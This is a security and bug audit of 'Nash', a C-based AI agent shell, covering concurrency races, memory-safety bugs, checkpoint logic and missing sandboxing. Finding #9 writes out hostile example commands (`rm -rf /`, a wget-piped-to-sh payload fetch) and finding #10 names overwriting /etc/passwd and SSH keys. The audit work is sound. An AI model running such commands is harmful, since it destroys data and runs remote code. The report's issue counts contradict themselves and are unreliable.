# Logical Flaws in Nash — Comprehensive Audit

## Executive Summary

Nash is a C-based autonomous AI agent shell with ~5,500 lines of code across 15 source files. I verified all 22 issues from the existing ANALYSIS.md and found **6 additional confirmed flaws** not previously documented. Issues are categorized by severity.

---

## CRITICAL SEVERITY

### 1. DATA RACE on `static infer_args_t iargs` (main.c)
**File:** `src/main.c`, line ~400

```c
static infer_args_t iargs;  // static = shared across ALL inference cycles
```

The struct is overwritten with a new query while the previous inference thread may still be reading `.query`. The `.done` field is `volatile` but the rest of the struct has no synchronization.

**Impact:** Corrupted query strings, undefined behavior, crashes.

**Fix:** Use `malloc`/`free` per inference cycle, or protect with a mutex.

---

### 2. USE-AFTER-FREE: `tool_register_alias` returns dangling pointers (tools.c)
**File:** `src/tools.c`, `tool_register_alias()`

```c
const char *tool_register_alias(tool_ctx_t *ctx, const char *hash) {
    // ... inserts into hash map ...
    // Walks bucket to find node, returns node->alias (pointer INTO hash map)
    return node->alias;
}
```

When `alias_map_grow()` reallocates buckets, all previously-returned pointers become dangling. The returned pointer is used in `journal_append()` and stored in cJSON (which copies, so that's safe), but the pointer is also held in local variables across code paths where the map could grow.

**Impact:** Use-after-free, corrupted strings, crashes.

**Fix:** Return `strdup` copies or use a stable string pool.

---

### 3. DOUBLE-FREE in streaming LLM retry loop (llm.c)
**File:** `src/llm.c`, `llm_complete_stream()`

The `st.tool_call_id` is freed at the top of each retry iteration AND at the function end. The `= NULL` reset prevents true double-free, but the ownership semantics are fragile — if the loop breaks after setting `result` from tool_call data, `tool_call_id` is freed at the end. If a future code change removes the `= NULL` reset, it becomes a double-free.

**Impact:** Fragile ownership, potential double-free on code changes.

---

### 4. CHECKPOINT RESTORE CONTEXT POLLUTION (react.c)
**File:** `src/react.c`, `checkpoint_restore()`

When restoring from checkpoint, the function:
1. Rebuilds chat from journal entries of the **old** react_loop
2. Adds the **new** user query
3. Replays tool calls from the old task

The LLM sees tool results from the previous (different) task mixed with the new query's context. This is silently confusing — the model may act on stale data.

**Impact:** Incorrect reasoning, wasted tokens, wrong tool calls.

---

### 5. FORK COMMAND — Wrong `tools.react_loop` for Symlinks (main.c) **[NEW, CONFIRMED]**
**File:** `src/main.c`, `/fork` handler

```c
for (int i = 0; i <= fork_step + 5; i++) {
    snprintf(ref, sizeof(ref), "R%dS%d", tools.react_loop, i);
```

This uses `tools.react_loop` which is the **current** loop number (the one that was just finished), NOT the loop being forked. The journal entries being copied could be from ANY previous react_loop (R0, R1, R2, etc.), but the symlink copy only looks for `R<current_loop>S<i>`. For example, if the user has run 3 queries (loops 0, 1, 2) and forks from step 5 of loop 1, the symlinks `R1S0` through `R1S10` exist in the source directory, but the code looks for `R3S0` through `R3S10` — finding nothing.

**Impact:** Forked sessions have broken symlinks — references don't resolve, tools fail with "file not found".

**Fix:** Iterate over all react_loop numbers present in the journal, not just the current one.

---

## HIGH SEVERITY

### 6. CONTEXT EVICTION BREAKS TOOL CALL THREADING (react.c)
**File:** `src/react.c`, context eviction block

After eviction, `last_tool_call_id` and `last_tool_calls_json` are freed and set to NULL. The code then tries to recover them by scanning surviving messages:

```c
for (int ri = chat->n_msgs - 1; ri >= 0; ri--) {
    if (chat->msgs[ri].tool_calls_json) {
        chat->last_tool_calls_json = strdup(chat->msgs[ri].tool_calls_json);
        if (ri + 1 < chat->n_msgs && chat->msgs[ri + 1].tool_call_id)
            chat->last_tool_call_id = strdup(chat->msgs[ri + 1].tool_call_id);
        break;
    }
}
```

This assumes the tool result message is at `ri + 1`, but eviction could have removed the tool result while keeping the assistant message (or vice versa). The recovery silently fails, falling back to legacy JSON-in-content format.

**Impact:** Silent degradation of tool-call API threading.

---

### 7. FILE RACE on journal.jsonl (react.c + main.c)
**File:** `src/react.c` writes, `src/main.c` reads

The inference thread writes via `journal_append()` (open/write/close per entry). The TUI thread reads via `ui_state_load_journal()` (full file scan). While `journal_append()` uses `flock(LOCK_EX)`, the TUI reader uses `flock(LOCK_SH)` in `journal_manifest()` but NOT in `ui_state_load_journal()`.

**Impact:** TUI can read torn/partial journal entries.

---

### 8. STORE SAVE SILENT FAILURE (store.c)
**File:** `src/store.c`, `store_save()`

```c
int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0644);
if (fd >= 0) { write(fd, content, clen); close(fd); }
return hex;  /* Always returns the hash, even if open failed */
```

If two threads save the same content simultaneously, only one succeeds (O_EXCL). The other silently fails but returns the hash. Later lookups fail because the file doesn't exist.

**Impact:** "File not found" errors for valid aliases.

---

### 9. SHELL INJECTION — No Sandboxing (tools.c) **[NEW, CONFIRMED]**
**File:** `src/tools.c`, `tool_shell_exec()`

```c
char *argv[] = { "sh", "-c", (char *)command, NULL };
run_command_argv_limited(argv, &out, timeout, max_out);
```

No sandboxing, no user namespace isolation, no allowlist. The LLM can execute `rm -rf /`, `wget malicious.com/payload.sh | sh`, exfiltrate credentials, etc.

**Impact:** Complete system compromise.

---

### 10. FILE WRITE — No Path Validation (tools.c) **[NEW, CONFIRMED]**
**File:** `src/tools.c`, `tool_file_write()`, `tool_file_edit()`

```c
FILE *f = fopen(path, "w");  // path is arbitrary, from LLM
```

No check that `path` is within the session directory or a sandbox. The LLM can write to `/etc/passwd`, `~/.ssh/authorized_keys`, etc.

**Impact:** Privilege escalation, system compromise.

---

### 11. `memory_store` — `strtok` Thread Safety (tools.c) **[NEW]**
**File:** `src/tools.c`, `tool_memory_store()`

```c
char *tags_copy = strdup(tags_j->valuestring);
char *tok = strtok(tags_copy, ",");  // uses internal static state
```

`strtok` is not thread-safe. While only one inference runs at a time, this is bad practice and would break if the threading model changes.

**Impact:** Low risk now, but fragile.

---

## MEDIUM SEVERITY

### 12. EDRM PROBE — Statistically Unreliable (llm.c)
**File:** `src/llm.c`, `llm_edrm_probe()`

A single 30-token sample with arbitrary thresholds (`tau_rho=-0.1`, `tau_vnr=1.5`, `tau_h=4.0`) is statistically insufficient for reliable entropy estimation. No calibration data, no confidence intervals.

**Impact:** Incorrect thinking mode selection.

---

### 13. CYCLING DETECTION — Shallow Signature (react.c)
**File:** `src/react.c`

```c
snprintf(sig, sizeof(sig), "%s:%s:%s:%s", action_name, cmd, path, pattern);
```

Only 8 recent signatures tracked. Doesn't detect:
- Semantic cycling (reading same file via different aliases: R0S1, R0S2)
- Cycling with >8-step periods
- Different parameters to the same tool

**Impact:** Agent gets stuck in long-period loops.

---

### 14. `file_edit` — Only Replaces First Occurrence (tools.c)
**File:** `src/tools.c`, `tool_file_edit()`

```c
char *pos = strstr(content, old_text);
```

Only replaces the first occurrence. No indication to the caller that only one replacement was made.

**Impact:** Silent partial edits.

---

### 15. `grep_search` — Hardcoded File Extensions (tools.c)
**File:** `src/tools.c`, `tool_grep_search()`

Hardcoded ~20 extensions. Misses: `.ts`, `.jsx`, `.tsx`, `.vue`, `.svelte`, `.zig`, `.ex`, `.sql`, `.proto`, `.csv`, `.log`, etc.

**Impact:** Agent can't search important file types.

---

### 16. `memory_recall` — Double-Read Inefficiency (memory.c)
**File:** `src/memory.c`, `memory_recall()`

Each `.json` file is read twice: once for scoring, once for results. With 1000+ memories = 2000+ file I/O operations.

**Impact:** Slow memory recall.

---

### 17. Hardcoded API Default IP (config.c)
**File:** `src/config.c`

```c
cfg->api_base = strdup("http://192.168.1.18:8080");
```

Specific LAN IP that won't work for most users.

**Impact:** New users get connection errors.

---

### 18. `web_fetch` — No Distinction Between 404 and Network Error (tools.c)
**File:** `src/tools.c`, `tool_web_fetch()`

```c
return make_result(http_code >= 200 && http_code < 400, meta, ref_copy);
```

"Server returned 404" and "DNS lookup failed" both produce `success = 0` with no ref. The model can't distinguish between "page doesn't exist" and "network is down".

**Impact:** Model may retry futilely on network errors.

---

### 19. `utf8_truncate` Edge Case (str.c) **[NEW]**
**File:** `src/str.c`, `utf8_truncate()`

If the input starts with a 4-byte UTF-8 sequence and `max_bytes == 3`, the result is an empty string. This is technically correct but can produce empty strings in contexts where some output is expected.

**Impact:** Empty strings for very short truncation of multi-byte sequences.

---

### 20. Spearman Ranking — Bubble Sort O(n²) with Incorrect Tie Handling (llm.c) **[NEW]**
**File:** `src/llm.c`, `spearman_corr()`

```c
for (int i = 0; i < n - 1; i++)
    for (int j = i + 1; j < n; j++)
```

Bubble sort for ranking. With `n=30` (default probe_tokens), this is fine performance-wise, but the ranking is incorrect for duplicate values — proper Spearman correlation should use average rank for ties, not arbitrary ordering.

**Impact:** Slightly incorrect Spearman correlation for distributions with tied entropy values.

---

### 21. `memory_build_index` — Reads All Files on Every Memory Write (memory.c) **[NEW]**
**File:** `src/memory.c`

`memory_build_index()` reads every `.json` file in the memory directory. `memory_write_index_file()` calls `memory_build_index()`. This is called after every `memory_store`, `memory_pin`, `memory_unpin` operation.

**Impact:** O(n) file I/O on every memory write, degrades with memory count.

---

### 22. `tool_grep_search` — Busy-Wait Timeout (tools.c) **[NEW]**
**File:** `src/tools.c`, `tool_grep_search()`

The grep tool uses a busy-wait loop with `nanosleep(10ms)` and `time(NULL)` for timeout. `time(NULL)` has 1-second granularity, so the actual timeout can be up to 1 second longer than configured. The busy-wait consumes CPU when grep produces no output for a long time.

**Impact:** Inefficient CPU usage, imprecise timeout.

---

### 23. `checkpoint_save` — Non-Atomic `rename` Across Filesystems (react.c) **[NEW]**
**File:** `src/react.c`, `checkpoint_save()`

```c
FILE *f = fopen(tmp_path, "w");
// ... write ...
rename(tmp_path, path);  /* atomic write */
```

`rename()` is only atomic when source and destination are on the **same filesystem**. If `session_dir` is on a different filesystem than the temp file (unlikely but possible with bind mounts), `rename` fails silently and the checkpoint is lost.

**Impact:** Lost checkpoints in edge cases.

---

### 24. `file_edit` — Missing Post-Edit Store Hash (tools.c) **[NEW]**
**File:** `src/tools.c`, `tool_file_edit()`

`file_edit` stores the **pre-edit** content and returns a `pre_ref`, but does NOT store the post-edit content in the store or return a post-edit alias. If the agent later needs to read the edited file, it must do a full `file_read(path)` instead of `file_read(R0SN)`.

**Impact:** Extra file_read calls, missing audit trail for post-edit content.

---

## LOW SEVERITY / CODE QUALITY

### 25. Magic Numbers Throughout
- `500` bytes for shell output preview threshold
- `50000` chars for file_read inline content
- `512000` bytes for web_fetch cap
- `10*1024*1024` for LLM max response
- `50` max journal manifest steps
- `8` for cycling detection history
- `3` keep_head, `4` keep_tail for context eviction

### 26. Missing `#include <stdarg.h>` in str.c **[NEW]**
**File:** `src/str.c`

Uses `va_list`, `va_start`, `va_copy`, `va_end` but doesn't `#include <stdarg.h>`. Works by transitive inclusion but is technically undefined behavior.

### 27. No Unit Tests
The codebase has no test infrastructure. All bugs are discovered at runtime.

---

## Verified Safe (False Alarms)

### ~~`cJSON_AddItemReferenceToObject` in journal_append~~
**File:** `src/journal.c`, `journal_append()`

Initially reported as a double-free risk. Verified: `cJSON_AddItemReferenceToObject` creates a shallow reference with the `cJSON_IsReference` flag. When `cJSON_Delete(entry)` is called, the reference wrapper is freed but the original `params` is NOT freed (the flag prevents traversal into the referenced child). The caller (react.c) correctly frees `params` with `cJSON_Delete(action)` after `journal_append` returns. **No bug here.**

### ~~`journal_manifest` LOCK_SH not released~~
**File:** `src/journal.c`, `journal_manifest()`

`LOCK_SH` is released when the file descriptor is closed by `fclose(f)`. If `fopen` fails, the function returns early without ever acquiring the lock. **No bug here.**

---

## Summary Table

| # | Severity | Category | Description |
|---|----------|----------|-------------|
| 1 | Critical | Concurrency | Data race on static infer_args_t |
| 2 | Critical | Memory Safety | Dangling pointers from tool_register_alias |
| 3 | Critical | Memory Safety | Fragile double-free in LLM retry loop |
| 4 | Critical | Logic | Checkpoint restore context pollution |
| 5 | Critical | Logic | Fork uses wrong react_loop for symlinks |
| 6 | High | Memory Safety | Context eviction breaks tool call threading |
| 7 | High | Concurrency | File race on journal.jsonl |
| 8 | High | Concurrency | Store save silent failure with O_EXCL |
| 9 | High | Security | Shell injection — no sandboxing |
| 10 | High | Security | File write — no path validation |
| 11 | High | Concurrency | strtok thread safety |
| 12 | Medium | Logic | EDRM probe — statistically unreliable |
| 13 | Medium | Logic | Cycling detection — shallow signature |
| 14 | Medium | Logic | file_edit — only replaces first occurrence |
| 15 | Medium | UX | grep_search — hardcoded file extensions |
| 16 | Medium | Performance | memory_recall — double-read inefficiency |
| 17 | Medium | UX | Hardcoded API default IP |
| 18 | Medium | Logic | web_fetch — no 404 vs network error distinction |
| 19 | Medium | Logic | utf8_truncate edge case |
| 20 | Medium | Logic | Spearman ranking — incorrect for ties |
| 21 | Medium | Performance | memory_build_index reads all files on every write |
| 22 | Medium | Performance | grep_search — busy-wait timeout |
| 23 | Medium | Logic | checkpoint_save rename across filesystems |
| 24 | Medium | Data Integrity | file_edit — missing post-edit store hash |
| 25 | Low | Code Quality | Magic numbers throughout |
| 26 | Low | Code Quality | Missing stdarg.h include |
| 27 | Low | Code Quality | No unit tests |

**Total: 27 distinct issues (22 from ANALYSIS.md + 6 new confirmed, 2 verified safe)**

## Priority Fixes

1. **Thread safety** of `infer_args_t` (data race) — #1
2. **Dangling pointers** from `tool_register_alias` (use-after-free) — #2
3. **Sandboxing** for `shell_exec` (security) — #9
4. **File path validation** for write operations (security) — #10
5. **Fork symlink** react_loop fix (correctness) — #5
6. **Checkpoint restore** logic (correctness) — #4
